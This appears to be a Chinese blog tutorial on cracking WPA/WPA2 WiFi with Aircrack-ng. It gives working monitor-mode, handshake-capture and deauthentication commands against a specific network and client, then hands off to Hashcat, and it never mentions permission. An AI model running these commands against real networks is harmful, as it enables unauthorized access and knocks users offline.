---
title: 破解WiFi密码（WPA/WPA2）
layout: post
---
如今，绝大部分的WiFi网络都采用了 WPA/WPA2 加密，WEP 加密已经极为罕见。所以本文就给大家介绍如何用 Aircrack-ng 工具包破解 WPA/WPA2 加密的 WiFi 网络。

Aircrack-ng 是一套 WiFi 网络审计工具，本文假定你已安装好了这套工具，如果还没有，可以参考<a href="http://www.aircrack-ng.org/install.html" target="_blank">Aircrack-ng Installation</a>。本文使用的环境是 Kali Linux ，其中已经集成了 Aircrack-ng。

首先，我们要抓取客户端和热点之间的握手包。

将无线网卡插入电脑，打开 Terminal，输入：

```
ifconfig -a              确认网卡已连接(wlan0)
ifconfig wlan0 up        加载网卡
airmon-ng start wlan0    切换网卡到 monitor 模式
ifconfig wlan0 down      卸载原始的 wlan0
```

返回结果：

[<img class="alignnone size-full wp-image-142" src="http://prdwb.github.io/images/2015/05/Image-044.png" alt="Aircrack-ng" width="685" height="103" />][1]

输入命令：

```
airodump-ng mon0  扫描无线网络
```<img class="alignnone size-full wp-image-143" src="http://prdwb.github.io/images/2015/05/Image-045.png" alt="Aircrack-ng" width="997" height="459" />  
选择一个想破解的网络，本文以第四条  D4:EE:07:0F:30:58   CH7   HiWiFi_0F3058  为例。</p> 

开始抓包：

```
airodump-ng mon0 -c 13 -w 0519 --bssid D4:EE:07:0F:30:58
```

-w 参数代表写入文件  
&#8211;bssid 为结果过滤

下面利用 Deauth 攻击加快破解进程，新打开一个 Terminal，输入：

```
aireplay-ng -0 10 -a D4:EE:07:0F:30:58 -c 2C:D0:5A:4C:FF:E3 mon0
```

这样会切断客户端和热点之间的连接，客户端尝试重新连接时，我们就会抓到握手包：

[<img class="alignnone size-full wp-image-144" src="http://prdwb.github.io/images/2015/05/Image-046.png" alt="Aircrack-ng" width="835" height="379" />][2]

找到保存好的 cap 文件，到 <a href="https://hashcat.net/cap2hccap/" target="_blank">https://hashcat.net/cap2hccap/</a> 转换为hccap文件，再利用 Hashcat 跑包，具体过程就不在此赘述了。

 [1]: http://prdwb.github.io/images/2015/05/Image-044.png
 [2]: http://prdwb.github.io/images/2015/05/Image-046.png